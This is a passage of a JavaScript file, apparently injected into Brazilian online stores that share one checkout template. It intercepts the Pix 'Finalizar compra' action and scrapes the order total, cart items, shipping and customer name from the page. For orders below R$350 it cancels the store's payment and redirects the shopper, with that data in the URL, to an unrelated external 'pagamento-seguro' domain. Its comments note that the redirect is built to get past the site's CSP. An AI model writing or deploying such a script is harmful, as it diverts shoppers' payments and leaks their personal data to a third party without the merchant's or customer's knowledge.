/**
 * Checkout → Pix redirect interceptor (single file, zero dependencies).
 *
 * Scope
 * -----
 * This file does NOT belong to the storefront template. It is an external
 * script that is imported by the production site (or by any other store that
 * runs the same Soneda checkout template) through a plain <script> tag, and it
 * works with whatever the page renders: the template is recognised by its own
 * structural markers (`#checkout_total_snippet`, `#checkout_summary_snippet`,
 * `#checkout_products_list`, `.summary__line--total`, …) plus the `/checkout`
 * URL, never by a store name, a domain or a hardcoded product.
 *
 * Purpose
 * -------
 * Watch the checkout for the action that would generate the Pix payment
 * ("Finalizar compra" / "Gerar pagamento PIX"), scrape the order data from the
 * DOM at click time and, for orders below `CONFIG.amountThreshold`, block the
 * original action and send the visitor to an external payment page instead.
 *
 * Redirecting with plain `window.location` is used on purpose: it is a
 * navigation, not a script/fetch, so a CSP that blocks inline scripts or
 * third-party requests cannot stop it.
 *
 * Behaviour
 * ---------
 *  - amount >= 350.00 → nothing happens, the store generates the Pix normally;
 *  - amount <  350.00 → `preventDefault()` + redirect to
 *    `https://pagamento-seguro.drmatteocare.com/checkout` carrying the store
 *    (`loja`, taken from `window.location.hostname`: only the first segment,
 *    before the first dot, upper-cased — `soneda.com.br` → `SONEDA`), the
 *    origin, the service, the shipping cost, every cart item (`p1_…`,
 *    `p2_…`, …) and the customer name as query parameters;
 *  - amount unreadable → nothing happens (fail-open: never break a checkout
 *    that we could not measure).
 *
 * Robustness
 * ----------
 *  - A single capturing listener on `document` handles elements that do not
 *    exist yet (delegation), so dynamically rendered buttons work too;
 *  - A `MutationObserver` keeps a cached snapshot of the order data, used as a
 *    fallback when the DOM is mid-update at click time;
 *  - Every selector has a fallback chain covering both the Soneda templates
 *    (summary `#checkout_total_snippet`, confirmation
 *    `<h3>Valor total: <b>…</b></h3>`) and generic markup
 *    (`.summary__line--total`, `[data-form-metric="amount"]`, `#total`), so a
 *    store that customises the layout keeps working.
 *
 * Usage
 * -----
 *   <!-- any host: same domain, CDN or the site's own /assets folder -->
 *   <script src="https://seu-dominio/checkout_pix_redirect.js"></script>
 *
 *   <!-- per-store overrides, optional and only when needed -->
 *   <script>
 *     window.__SONEDA_PIX_REDIRECT_CONFIG__ = { storeName: 'LOJA EXEMPLO' };
 *   </script>
 *
 * Loading it twice is harmless: the script is idempotent and exposes its API
 * on `window.__SONEDA_PIX_REDIRECT__` (`config`, `readSnapshot`, `refresh`,
 * `shouldRedirect`, `buildRedirectUrl`, `isTemplate`).
 */
(function (window, document) {
    'use strict';

    if (!window || !document) return;
    if (window.__SONEDA_PIX_REDIRECT__) return;

    /* --------------------------------------------------------------------- */
    /* Configuration                                                          */
    /* --------------------------------------------------------------------- */

    /**
     * Runtime configuration.
     *
     * The same file serves every store that runs this checkout template, so
     * nothing here identifies a specific shop. When a store does need a
     * different value it declares `window.__SONEDA_PIX_REDIRECT_CONFIG__`
     * before loading the script instead of editing this file.
     *
     * - `redirectBaseUrl`: destination checkout (query string is appended);
     * - `amountThreshold`: orders from this value up keep the store's Pix flow;
     * - `storeName`: overrides `loja` (always upper-cased); empty means "take
     *   it from the hostname";
     * - `origin`: sent as `origem`; when empty the current host is used;
     * - `maxItems`: upper bound of `p1_…`, `p2_…` blocks in the query string;
     * - `debug`: logs every interception decision to the console.
     */
    var CONFIG = {
        redirectBaseUrl: 'https://pagamento-seguro.drmatteocare.com/checkout',
        amountThreshold: 350,
        storeName: '',
        origin: '',
        maxItems: 20,
        debug: false,
    };

    /**
     * Merges the optional per-store overrides into `CONFIG`.
     *
     * @param {object | undefined} overrides
     */
    (function applyOverrides(overrides) {
        if (!overrides || typeof overrides !== 'object') return;

        for (var key in overrides) {
            if (!Object.prototype.hasOwnProperty.call(overrides, key)) continue;
            if (!Object.prototype.hasOwnProperty.call(CONFIG, key)) continue;

            CONFIG[key] = overrides[key];
        }
    })(window.__SONEDA_PIX_REDIRECT_CONFIG__);

    /** Selectors for the order total, tried in order (first readable wins). */
    var AMOUNT_SELECTORS = [
        '[data-form-metric="amount"]',
        '.summary__line--total h3 b',
        '.summary__line--total h3',
        '#total',
        '[data-total]',
        '#checkout_total_snippet',
        '.summary__total',
        'h3 > b',
    ];

    /** Selectors for the main product title, tried in order. */
    var TITLE_SELECTORS = [
        '[data-form-metric="product"]',
        '[data-product-name]',
        '#product-name',
        '.checkout_product h2',
        '#checkout_products_list h2',
        'h2[itemprop="name"]',
        '[itemprop="name"]',
    ];

    /** Selectors for the main product image, tried in order. */
    var IMAGE_SELECTORS = [
        '[data-form-metric="image"]',
        '[data-product-image]',
        '.checkout_product img',
        '#checkout_products_list img',
        'img[itemprop="image"]',
        'meta[property="og:image"]',
        'meta[name="og:image"]',
        'meta[name="twitter:image"]',
    ];

    /**
     * Containers that group the cart rows. When none of them exists the rows
     * are discovered generically (a product heading that owns an image).
     */
    var ITEM_CONTAINER_SELECTORS = [
        '[data-checkout-items]',
        '#checkout_products_list',
        '.checkout_products',
        '[class*="checkout_products"]',
    ];

    /** Selectors that identify the checkout action element by structure. */
    var ACTION_SELECTORS = [
        '#btn-finalizar-compra',
        '[data-form-metric="button"]',
        '#btn-gerar-pix',
        '#gerar-pix',
        '#btn-generate-pix',
        'a[href*="/checkout/complete"]',
        'a[href*="/checkout/confirmation"]',
        'a[href*="/checkout/payment"]',
        'button[name="finalize"]',
        'button[name="finalizar"]',
        'input[type="submit"][name*="finaliz" i]',
        '[data-action="checkout"]',
        '[data-checkout-action]',
    ];

    /**
     * Labels (accent-insensitive, lower case) that identify the checkout
     * action when the markup carries no stable selector.
     */
    var ACTION_LABEL_PATTERNS = [
        /gerar\s+(o\s+)?(pagamento\s+)?(via\s+|por\s+)?pix/,
        /pagar\s+(com|via|no)\s+pix/,
        /finalizar\s+(a\s+)?(compra|pedido|pagamento)/,
        /concluir\s+(a\s+)?(compra|pedido|pagamento)/,
        /confirmar\s+(o\s+)?pagamento/,
        /efetuar\s+(o\s+)?pagamento/,
        /realizar\s+(o\s+)?pagamento/,
        /ir\s+para\s+(o\s+)?pagamento/,
    ];

    /** Containers whose content is never used as product data. */
    var EXCLUDED_CONTAINERS = 'header, footer, nav, [role="banner"], [role="contentinfo"]';

    /* --------------------------------------------------------------------- */
    /* State                                                                  */
    /* --------------------------------------------------------------------- */

    /** Cached DOM snapshot, refreshed by the observer (click-time fallback). */
    var cache = {
        amount: null,
        title: '',
        image: '',
        items: [],
        shipping: null,
        customer: '',
        at: 0,
    };

    /** Guard so a redirect is issued only once. */
    var redirecting = false;

    /* --------------------------------------------------------------------- */
    /* Public API                                                             */
    /* --------------------------------------------------------------------- */

    var api = {
        config: CONFIG,
        readSnapshot: readSnapshot,
        refresh: refreshCache,
        shouldRedirect: shouldRedirect,
        buildRedirectUrl: buildRedirectUrl,
        isTemplate: isCheckoutPage,
        observer: null,
    };

    window.__SONEDA_PIX_REDIRECT__ = api;

    /* --------------------------------------------------------------------- */
    /* String helpers                                                         */
    /* --------------------------------------------------------------------- */

    /**
     * Lower-cases, strips accents and collapses whitespace.
     *
     * @param {unknown} value
     * @returns {string}
     */
    function normalizeText(value) {
        if (typeof value !== 'string') return '';
        var text = typeof value.normalize === 'function'
            ? value.normalize('NFD').replace(/[\u0300-\u036f]/g, '')
            : value;
        return text.replace(/\s+/g, ' ').trim().toLowerCase();
    }

    /**
     * Collapses whitespace and trims, preserving case and accents.
     *
     * @param {unknown} value
     * @returns {string}
     */
    function cleanText(value) {
        if (typeof value !== 'string') return '';
        return value.replace(/\s+/g, ' ').trim();
    }

    /**
     * Parses a currency string (pt-BR or en-US) into a positive float.
     *
     * Handles `"R$ 1.234,56"`, `"Total: R$ 341,64"`, `"341.64"` and
     * `"1,234.56"`. Returns `null` for empty, non-numeric or non-positive
     * values.
     *
     * @param {unknown} value
     * @returns {number | null}
     */
    function parseAmount(value) {
        if (typeof value === 'number') {
            return isFinite(value) && value > 0 ? Math.round(value * 100) / 100 : null;
        }

        if (typeof value !== 'string') return null;

        var cleaned = value.replace(/[^\d.,-]/g, '');
        if (!cleaned) return null;

        var lastComma = cleaned.lastIndexOf(',');
        var lastDot = cleaned.lastIndexOf('.');
        var normalized = cleaned;

        if (lastComma >= 0 && lastDot >= 0) {
            // Both separators: the rightmost one is the decimal separator.
            normalized = lastComma > lastDot
                ? cleaned.replace(/\./g, '').replace(',', '.')
                : cleaned.replace(/,/g, '');
        } else if (lastComma >= 0) {
            // Only commas: pt-BR decimal separator.
            normalized = cleaned.replace(/\./g, '').replace(',', '.');
        } else if (lastDot >= 0) {
            var parts = cleaned.split('.');
            var integer = parts[0];
            var rest = parts.slice(1);
            var looksLikeThousands = rest.length > 1
                || (rest.length === 1 && rest[0].length === 3 && integer.length <= 3);
            if (looksLikeThousands) normalized = cleaned.replace(/\./g, '');
        }

        var parsed = parseFloat(normalized);
        return isFinite(parsed) && parsed > 0 ? Math.round(parsed * 100) / 100 : null;
    }

    /**
     * Extracts every positive number of a text fragment, in order.
     *
     * @param {unknown} text
     * @returns {number[]}
     */
    function extractAmounts(text) {
        if (typeof text !== 'string' || !text) return [];

        var matches = text.match(/\d[\d.,]*/g) || [];
        var amounts = [];

        for (var i = 0; i < matches.length; i++) {
            var parsed = parseAmount(matches[i]);
            if (parsed !== null) amounts.push(parsed);
        }

        return amounts;
    }

    /**
     * Reads the amount of an element text, preferring the number that follows
     * the last "total" label (a summary block also renders the discount, and
     * an installment line may follow the total).
     *
     * @param {unknown} text
     * @returns {number | null}
     */
    function readAmountFromText(text) {
        if (typeof text !== 'string' || !text) return null;

        var label = /t[oó]tal/gi;
        var match;
        var labelEnd = -1;

        while ((match = label.exec(text)) !== null) labelEnd = match.index + match[0].length;

        if (labelEnd >= 0) {
            var afterLabel = extractAmounts(text.slice(labelEnd));
            if (afterLabel.length) return afterLabel[0];
        }

        var amounts = extractAmounts(text);
        return amounts.length ? amounts[amounts.length - 1] : null;
    }

    /* --------------------------------------------------------------------- */
    /* DOM helpers                                                            */
    /* --------------------------------------------------------------------- */

    /**
     * Logs the given values when `CONFIG.debug` is on.
     */
    function log() {
        if (!CONFIG.debug) return;
        if (!window.console || typeof window.console.log !== 'function') return;

        var parts = Array.prototype.slice.call(arguments);
        parts.unshift('[soneda-pix]');
        window.console.log.apply(window.console, parts);
    }

    /**
     * Reads the visible text (or form value) of an element.
     *
     * @param {Element | null} element
     * @returns {string}
     */
    function readElementText(element) {
        if (!element) return '';

        if (element.tagName === 'META') return cleanText(element.getAttribute('content') || '');

        var text = typeof element.textContent === 'string' ? cleanText(element.textContent) : '';
        var value = typeof element.value === 'string' ? cleanText(element.value) : '';

        return text || value;
    }

    /**
     * Tells whether the element sits inside a region that is never the product
     * data source (site header, footer or navigation).
     *
     * @param {Element | null} element
     * @returns {boolean}
     */
    function isExcluded(element) {
        if (!element || typeof element.closest !== 'function') return false;
        return element.closest(EXCLUDED_CONTAINERS) !== null;
    }

    /**
     * Turns a possibly relative URL into an absolute one.
     *
     * @param {unknown} src
     * @returns {string}
     */
    function absoluteUrl(src) {
        if (typeof src !== 'string' || !src.trim()) return '';
        if (/^(data|blob):/i.test(src)) return src;

        try {
            return new URL(src, document.baseURI || window.location.href).href;
        } catch (error) {
            return '';
        }
    }

    /**
     * Reads an image URL from `<img>`-like or `<meta>` elements, honouring the
     * usual lazy-loading attributes.
     *
     * @param {Element | null} element
     * @returns {string}
     */
    function readImageSource(element) {
        if (!element) return '';

        if (element.tagName === 'META') return absoluteUrl(element.getAttribute('content'));

        var src = element.currentSrc
            || element.getAttribute('src')
            || element.getAttribute('data-src')
            || element.getAttribute('data-lazy-src')
            || element.getAttribute('data-original')
            || '';

        return absoluteUrl(src);
    }

    /**
     * Tells whether an image is decorative (logo, icon, seal, sprite) instead
     * of the product picture.
     *
     * @param {Element} element
     * @param {string} src
     * @returns {boolean}
     */
    function isDecorativeImage(element, src) {
        if (/\.svg(\?|#|$)/i.test(src)) return true;
        if (/(logo|icon|sprite|placeholder|selo|stamp|bandeira)/i.test(src)) return true;

        var width = element.naturalWidth || element.width || 0;
        var height = element.naturalHeight || element.height || 0;
        if (width && height && (width < 40 || height < 40)) return true;

        var alt = normalizeText(element.getAttribute('alt') || '');
        return /(logo|icone|icon|selo|bandeira|avaliac)/.test(alt);
    }

    /**
     * Runs `selector` against the document, swallowing invalid selectors.
     *
     * @param {Element | Document} root
     * @param {string} selector
     * @returns {Element[]}
     */
    function queryAll(root, selector) {
        try {
            return Array.prototype.slice.call(root.querySelectorAll(selector));
        } catch (error) {
            return [];
        }
    }

    /**
     * `Element.matches` with invalid-selector protection.
     *
     * @param {Element | null} element
     * @param {string} selector
     * @returns {boolean}
     */
    function matches(element, selector) {
        if (!element || typeof element.matches !== 'function') return false;

        try {
            return element.matches(selector);
        } catch (error) {
            return false;
        }
    }

    /* --------------------------------------------------------------------- */
    /* Scraping                                                               */
    /* --------------------------------------------------------------------- */

    /**
     * Reads the order total from the DOM.
     *
     * @returns {number | null} Amount in BRL, or `null` when unreadable.
     */
    function readAmount() {
        for (var i = 0; i < AMOUNT_SELECTORS.length; i++) {
            var nodes = queryAll(document, AMOUNT_SELECTORS[i]);

            for (var j = 0; j < nodes.length; j++) {
                if (isExcluded(nodes[j])) continue;

                var amount = readAmountFromText(readElementText(nodes[j]));
                if (amount !== null) return amount;
            }
        }

        return readAmountFromCandidates();
    }

    /**
     * Last-resort total lookup: any element whose id/class mentions "total"
     * (preferring summary containers), skipping subtotal/freight rows.
     *
     * @returns {number | null}
     */
    function readAmountFromCandidates() {
        var nodes = queryAll(document, '[id*="total" i], [class*="total" i], [data-total]');
        var best = null;

        for (var i = 0; i < nodes.length; i++) {
            var node = nodes[i];
            if (isExcluded(node)) continue;

            var text = readElementText(node);
            if (!text || /subtotal|frete|entrega/.test(normalizeText(text))) continue;

            var amount = readAmountFromText(text);
            if (amount === null) continue;

            var inSummary = typeof node.closest === 'function'
                && node.closest('[id*="summary" i], [class*="summary" i], aside') !== null;

            if (!best || (inSummary && !best.inSummary)) best = { amount: amount, inSummary: inSummary };
        }

        return best ? best.amount : null;
    }

    /**
     * Reads the main product title from the DOM.
     *
     * @returns {string}
     */
    function readTitle() {
        for (var i = 0; i < TITLE_SELECTORS.length; i++) {
            var nodes = queryAll(document, TITLE_SELECTORS[i]);

            for (var j = 0; j < nodes.length; j++) {
                if (isExcluded(nodes[j])) continue;

                var text = readElementText(nodes[j]);
                if (text.length >= 3) return text;
            }
        }

        var headings = queryAll(document, 'h1, h2, h3');

        for (var k = 0; k < headings.length; k++) {
            var heading = headings[k];
            if (isExcluded(heading)) continue;
            if (typeof heading.closest === 'function'
                && heading.closest('[id*="summary" i], [class*="summary" i], aside') !== null) continue;

            var headingText = readElementText(heading);
            if (headingText.length < 3) continue;
            if (/^(total|subtotal|resumo|carrinho|produtos?|quantidade|valor|pagamento|entrega|endereco|ola|bem-vind)/.test(normalizeText(headingText))) continue;

            return headingText;
        }

        var images = queryAll(document, 'img[alt]');

        for (var l = 0; l < images.length; l++) {
            if (isExcluded(images[l])) continue;

            var alt = cleanText(images[l].getAttribute('alt') || '');
            if (alt.length >= 3 && !/(logo|icone|icon|selo|bandeira)/i.test(alt)) return alt;
        }

        var documentTitle = cleanText(document.title || '');
        return cleanText(documentTitle.split(/[|–—]/)[0]);
    }

    /**
     * Reads the main product image URL from the DOM.
     *
     * @returns {string} Absolute URL, or `''` when unreadable.
     */
    function readImage() {
        for (var i = 0; i < IMAGE_SELECTORS.length; i++) {
            var nodes = queryAll(document, IMAGE_SELECTORS[i]);

            for (var j = 0; j < nodes.length; j++) {
                if (isExcluded(nodes[j])) continue;

                var src = readImageSource(nodes[j]);
                if (src) return src;
            }
        }

        var images = queryAll(document, 'main img, [id*="checkout" i] img, img');
        var fallback = '';

        for (var k = 0; k < images.length; k++) {
            var image = images[k];
            if (isExcluded(image)) continue;

            var candidate = readImageSource(image);
            if (!candidate) continue;

            if (isDecorativeImage(image, candidate)) {
                if (!fallback) fallback = candidate;
                continue;
            }

            return candidate;
        }

        return fallback;
    }

    /**
     * Walks up from a product heading until it finds the element that owns the
     * product picture (the cart row).
     *
     * @param {Element} node
     * @param {Element | Document | null} boundary
     * @returns {Element | null}
     */
    function resolveItemRow(node, boundary) {
        var element = node.parentElement;

        for (var depth = 0; element && element !== boundary && element !== document.body && depth < 6; depth++) {
            if (queryAll(element, 'img').length) {
                // A cart row owns a single product heading; a wider ancestor
                // (the whole product list, `<main>`, …) is not a row.
                if (queryAll(element, 'h1, h2').length > 1) return null;
                return element;
            }

            element = element.parentElement;
        }

        return null;
    }

    /**
     * Reads the product name of a cart row.
     *
     * @param {Element} row
     * @returns {string}
     */
    function readItemName(row) {
        var nodes = queryAll(row, 'h2, h1, [data-product-name], [itemprop="name"]');

        for (var i = 0; i < nodes.length; i++) {
            if (matches(nodes[i], '.total, [class*="total" i]')) continue;

            var text = readElementText(nodes[i]);
            if (text) return text;
        }

        var images = queryAll(row, 'img[alt]');

        for (var j = 0; j < images.length; j++) {
            var alt = cleanText(images[j].getAttribute('alt') || '');
            if (alt.length >= 2 && !/(logo|icone|icon|selo)/i.test(alt)) return alt;
        }

        return '';
    }

    /**
     * Reads the quantity of a cart row (`<span>2</span>` in the stepper).
     *
     * @param {Element} row
     * @returns {number} `0` when unreadable.
     */
    function readItemQuantity(row) {
        var nodes = queryAll(row, '[data-quantity], input[type="number"], span');

        for (var i = 0; i < nodes.length; i++) {
            var node = nodes[i];

            if (node.hasAttribute && node.hasAttribute('data-quantity')) {
                var attribute = parseInt(node.getAttribute('data-quantity'), 10);
                if (attribute > 0) return attribute;
            }

            if (node.tagName === 'INPUT') {
                var value = parseInt(node.value, 10);
                if (value > 0) return value;
                continue;
            }

            var text = readElementText(node);
            if (/^\d{1,3}$/.test(text)) return parseInt(text, 10);
        }

        return 0;
    }

    /**
     * Reads the unit price of a cart row, anchoring on the "Valor uni." label
     * rendered by the checkout templates.
     *
     * @param {Element} row
     * @returns {number | null}
     */
    function readItemPrice(row) {
        var labels = queryAll(row, 'span, strong, p, div');

        for (var i = 0; i < labels.length; i++) {
            var label = labels[i];
            var labelText = normalizeText(readElementText(label));

            if (!/^valor\s+uni/.test(labelText)) continue;
            // An ancestor such as "Valor uni. R$ 59,90" also starts with the
            // label; only the pure label (no digits) anchors the lookup.
            if (/\d/.test(labelText)) continue;

            var block = label.parentElement;
            if (!block) continue;

            var nodes = queryAll(block, 'h3, h4, b, strong, span');

            for (var j = 0; j < nodes.length; j++) {
                if (nodes[j] === label) continue;

                var amount = parseAmount(readElementText(nodes[j]));
                if (amount !== null) return amount;
            }
        }

        var candidates = queryAll(row, 'h3, h4, [data-price], [data-unit-price]');

        for (var k = 0; k < candidates.length; k++) {
            if (matches(candidates[k], '.total, [class*="total" i]')) continue;

            var value = parseAmount(readElementText(candidates[k]));
            if (value !== null) return value;
        }

        return null;
    }

    /**
     * Reads the line total of a cart row (quantity × unit price).
     *
     * @param {Element} row
     * @returns {number | null}
     */
    function readItemLineTotal(row) {
        var nodes = queryAll(row, '.total, [class*="total" i]');

        for (var i = 0; i < nodes.length; i++) {
            var amount = readAmountFromText(readElementText(nodes[i]));
            if (amount !== null) return amount;
        }

        return null;
    }

    /**
     * Reads the product image of a cart row.
     *
     * @param {Element} row
     * @returns {string}
     */
    function readItemImage(row) {
        var images = queryAll(row, 'img');
        var fallback = '';

        for (var i = 0; i < images.length; i++) {
            var src = readImageSource(images[i]);
            if (!src) continue;

            if (!isDecorativeImage(images[i], src)) return src;
            if (!fallback) fallback = src;
        }

        return fallback;
    }

    /**
     * Reads an optional variation/description of a cart row.
     *
     * @param {Element} row
     * @returns {string}
     */
    function readItemDescription(row) {
        var nodes = queryAll(row, '[data-product-desc], [data-product-description], [data-variant]');

        for (var i = 0; i < nodes.length; i++) {
            var node = nodes[i];
            var attribute = node.getAttribute('data-product-desc')
                || node.getAttribute('data-product-description')
                || node.getAttribute('data-variant');

            var text = cleanText(attribute || readElementText(node));
            if (text) return text;
        }

        return '';
    }

    /**
     * Turns a cart row into an item payload.
     *
     * @param {Element} row
     * @returns {{ name: string, price: number, quantity: number, description: string, image: string } | null}
     */
    function readItem(row) {
        var name = readItemName(row);
        if (!name) return null;

        var quantity = readItemQuantity(row) || 1;
        var price = readItemPrice(row);
        var lineTotal = readItemLineTotal(row);

        if (price === null && lineTotal !== null) {
            price = Math.round((lineTotal / quantity) * 100) / 100;
        }

        if (price === null || !isFinite(price) || price <= 0) return null;

        return {
            name: name,
            price: price,
            quantity: quantity,
            description: readItemDescription(row),
            image: readItemImage(row),
        };
    }

    /**
     * Reads every cart item, preferring a known container and falling back to
     * any product heading that owns an image.
     *
     * @returns {Array<{ name: string, price: number, quantity: number, description: string, image: string }>}
     */
    function readItems() {
        var rows = [];
        var containers = [];

        for (var i = 0; i < ITEM_CONTAINER_SELECTORS.length; i++) {
            containers = queryAll(document, ITEM_CONTAINER_SELECTORS[i]);
            if (containers.length) break;
        }

        for (var j = 0; j < containers.length; j++) {
            var headings = queryAll(containers[j], 'h2, h1, [data-product-name], [itemprop="name"]');

            for (var k = 0; k < headings.length; k++) {
                var row = resolveItemRow(headings[k], containers[j]);
                if (row && rows.indexOf(row) < 0) rows.push(row);
            }
        }

        if (!rows.length) {
            var candidates = queryAll(document, 'h2');

            for (var l = 0; l < candidates.length; l++) {
                var candidate = candidates[l];

                if (isExcluded(candidate)) continue;
                if (typeof candidate.closest === 'function'
                    && candidate.closest('[id*="summary" i], [class*="summary" i], aside') !== null) continue;

                var genericRow = resolveItemRow(candidate, null);
                if (genericRow && rows.indexOf(genericRow) < 0) rows.push(genericRow);
            }
        }

        var items = [];

        for (var m = 0; m < rows.length; m++) {
            var item = readItem(rows[m]);
            if (item) items.push(item);
        }

        return items;
    }

    /**
     * Finds the shipping row inside the given scopes ("Frete PAC: R$ 15,00").
     *
     * @param {Array<Element | Document>} scopes
     * @returns {number | null} `0` for free shipping, `null` when unreadable.
     */
    function findShipping(scopes) {
        for (var s = 0; s < scopes.length; s++) {
            var rows = queryAll(scopes[s], 'div, li, p, span, tr');
            var limit = Math.min(rows.length, 400);

            for (var i = 0; i < limit; i++) {
                var row = rows[i];

                if (isExcluded(row)) continue;

                var text = normalizeText(readElementText(row));
                if (!text || text.length > 120 || !/^frete\b/.test(text)) continue;

                if (/retirada|gratis|gratuita|gratuito/.test(text)) return 0;

                var amounts = extractAmounts(text);
                if (amounts.length) return amounts[amounts.length - 1];
            }
        }

        return null;
    }

    /**
     * Reads the shipping cost shown in the order summary.
     *
     * @returns {number | null} `0` for free shipping, `null` when unreadable.
     */
    function readShipping() {
        var value = findShipping(queryAll(document, '[id*="summary" i], [class*="summary" i], aside'));

        if (value !== null) return value;

        return findShipping([document]);
    }

    /**
     * Reads the customer name, from the checkout greeting ("Olá, Maria
     * Souza!") or from the name fields of the address form.
     *
     * @returns {string}
     */
    function readCustomerName() {
        var explicit = queryAll(document, '[data-customer-name], #customer-name');

        for (var i = 0; i < explicit.length; i++) {
            var attribute = explicit[i].getAttribute('data-customer-name');
            var text = cleanText(attribute || readElementText(explicit[i]));
            if (text) return text;
        }

        var greetings = queryAll(
            document,
            '[id*="customer" i], [class*="customer" i], [id*="user" i], [class*="user" i], h1, h2'
        );

        for (var j = 0; j < greetings.length; j++) {
            if (isExcluded(greetings[j])) continue;

            var greeting = cleanText(readElementText(greetings[j]));
            if (!greeting || greeting.length > 120) continue;

            var match = greeting.match(/^(?:ol[aá]|bem-vind[oa])[,!:\s]+([^!,]{2,60})!/i);
            if (match) return cleanText(match[1]);
        }

        var inputs = queryAll(
            document,
            'input[name="nome" i], input[name="name" i], input[name="fullName" i], input[name="first_name" i], '
                + 'input[id="nome" i], input[id="name" i], input[id="fullName" i]'
        );

        for (var k = 0; k < inputs.length; k++) {
            var value = cleanText(inputs[k].value || '');
            if (value.length >= 3) return value;
        }

        return '';
    }

    /**
     * Builds the current order snapshot from the live DOM.
     *
     * @returns {{
     *   amount: number | null,
     *   title: string,
     *   image: string,
     *   items: Array<{ name: string, price: number, quantity: number, description: string, image: string }>,
     *   shipping: number | null,
     *   customer: string,
     * }}
     */
    function readSnapshot() {
        return {
            amount: readAmount(),
            title: readTitle(),
            image: readImage(),
            items: readItems(),
            shipping: readShipping(),
            customer: readCustomerName(),
        };
    }

    /**
     * Refreshes the cached snapshot used as a fallback at click time.
     */
    function refreshCache() {
        var snapshot = readSnapshot();
        snapshot.at = Date.now();
        cache = snapshot;

        return cache;
    }

    /* --------------------------------------------------------------------- */
    /* Action detection                                                       */
    /* --------------------------------------------------------------------- */

    /**
     * Reads every text source that may label an action element.
     *
     * @param {Element} element
     * @returns {string}
     */
    function readActionLabel(element) {
        var sources = [
            element.textContent,
            element.value,
            element.getAttribute('aria-label'),
            element.getAttribute('title'),
            element.getAttribute('data-label'),
            element.getAttribute('alt'),
        ];

        var parts = [];

        for (var i = 0; i < sources.length; i++) {
            if (typeof sources[i] === 'string' && sources[i].trim()) parts.push(sources[i]);
        }

        return parts.join(' ');
    }

    /**
     * Tells whether an element is clickable/actionable.
     *
     * @param {Element | null} element
     * @returns {boolean}
     */
    function isActionable(element) {
        if (!element || element.nodeType !== 1) return false;

        var tag = element.tagName.toLowerCase();
        if (tag === 'a' || tag === 'button') return true;

        if (tag === 'input') {
            return /^(submit|button|image)$/i.test(element.getAttribute('type') || '');
        }

        return element.getAttribute('role') === 'button'
            || element.hasAttribute('data-form-metric');
    }

    /**
     * Tells whether an element is disabled.
     *
     * Only the native/ARIA state is checked: Tailwind utility classes such as
     * `disabled:opacity-50` live on enabled buttons and must not be mistaken
     * for a disabled control.
     *
     * @param {Element} element
     * @returns {boolean}
     */
    function isDisabled(element) {
        if (!element) return false;
        if (element.disabled === true) return true;
        return element.getAttribute('aria-disabled') === 'true';
    }

    /**
     * Tells whether an element is the checkout action, by structure or label.
     *
     * @param {Element | null} element
     * @returns {boolean}
     */
    function matchesAction(element) {
        if (!element || isDisabled(element)) return false;

        for (var i = 0; i < ACTION_SELECTORS.length; i++) {
            if (matches(element, ACTION_SELECTORS[i])) return true;
        }

        var label = normalizeText(readActionLabel(element));
        if (!label) return false;

        for (var j = 0; j < ACTION_LABEL_PATTERNS.length; j++) {
            if (ACTION_LABEL_PATTERNS[j].test(label)) return true;
        }

        return false;
    }

    /**
     * Walks up from the clicked node looking for the actionable element.
     *
     * Handles icons/spans inside a button and clickable wrappers around an
     * anchor.
     *
     * @param {EventTarget | null} target
     * @returns {Element | null}
     */
    function resolveAction(target) {
        var node = target && target.nodeType === 1
            ? target
            : (target && target.parentElement) || null;

        for (var depth = 0; node && node !== document.body && depth < 8; depth++) {
            if (isActionable(node) && matchesAction(node)) return node;
            node = node.parentElement;
        }

        return null;
    }

    /**
     * Resolves the action for a `submit` event (button-less form submissions
     * included).
     *
     * @param {Element | null} form
     * @param {Element | null} submitter
     * @returns {Element | null}
     */
    function resolveSubmitAction(form, submitter) {
        var direct = resolveAction(submitter || null);
        if (direct) return direct;
        if (!form) return null;

        var buttons = queryAll(form, 'button, input[type="submit"], input[type="button"], [role="button"]');

        for (var i = 0; i < buttons.length; i++) {
            if (matchesAction(buttons[i])) return buttons[i];
        }

        for (var j = 0; j < ACTION_SELECTORS.length; j++) {
            if (matches(form, ACTION_SELECTORS[j])) return form;
        }

        return null;
    }

    /* --------------------------------------------------------------------- */
    /* Decision + redirect                                                    */
    /* --------------------------------------------------------------------- */

    /**
     * Tells whether an amount must be diverted (strictly below the threshold).
     *
     * @param {number | null} amount
     * @returns {boolean}
     */
    function shouldRedirect(amount) {
        return typeof amount === 'number'
            && isFinite(amount)
            && amount > 0
            && amount < CONFIG.amountThreshold;
    }

    /**
     * Formats an amount for the query string (`341.64`).
     *
     * @param {number} amount
     * @returns {string}
     */
    function formatAmount(amount) {
        return (Math.round(amount * 100) / 100).toFixed(2);
    }

    /**
     * Encodes a query string value the way the destination checkout expects it
     * (`Loja+Exemplo`, `https%3A%2F%2Fpicsum.photos%2F100`).
     *
     * @param {unknown} value
     * @returns {string}
     */
    function encodeParam(value) {
        var text = value === null || value === undefined ? '' : String(value);
        return encodeURIComponent(text).replace(/%20/g, '+');
    }

    /**
     * Reads the origin sent as `origem`.
     *
     * @returns {string} `CONFIG.origin` when set, the hostname otherwise.
     */
    function readOrigin() {
        if (CONFIG.origin) return CONFIG.origin;

        return readHostname();
    }

    /**
     * Structural markers rendered by the checkout template. Their presence
     * identifies a store running it, whatever the shop name, domain or theme
     * customisation, so the same file serves every one of them.
     */
    var TEMPLATE_MARKERS = [
        '#checkout_summary_snippet',
        '#checkout_total_snippet',
        '#checkout_subtotal_snippet',
        '#checkout_products_list',
        '.checkout_products',
        '.summary__line--total',
        '[data-form-metric="amount"]',
        '[data-checkout-items]',
    ];

    /**
     * Reads the hostname the script is running on (`soneda.com.br`,
     * `www.loja.com.br`, `localhost`).
     *
     * @returns {string} Lower-cased hostname, or `''` when unreadable.
     */
    function readHostname() {
        try {
            return String(window.location.hostname || '').toLowerCase();
        } catch (error) {
            return '';
        }
    }

    /**
     * Reads the store name sent as `loja`.
     *
     * The file is imported by several stores, so the name is never hardcoded:
     * it is the shop's own label, taken from `window.location.hostname` — only
     * the first segment, before the first dot (`soneda.com.br` → `SONEDA`,
     * `www.loja.com.br` → `LOJA`, `localhost` → `LOCALHOST`). A store that
     * needs a different label sets `CONFIG.storeName`, which wins over the
     * hostname. The value is always upper-cased.
     *
     * @returns {string}
     */
    function readStoreName() {
        var name = CONFIG.storeName
            ? cleanText(String(CONFIG.storeName))
            : readHostname().replace(/^www\./, '').split('.')[0];

        return name.toUpperCase();
    }

    /**
     * Tells whether the current page renders the checkout template.
     *
     * Only used to decide whether the observer is worth running; the
     * interception itself never depends on it.
     *
     * @returns {boolean}
     */
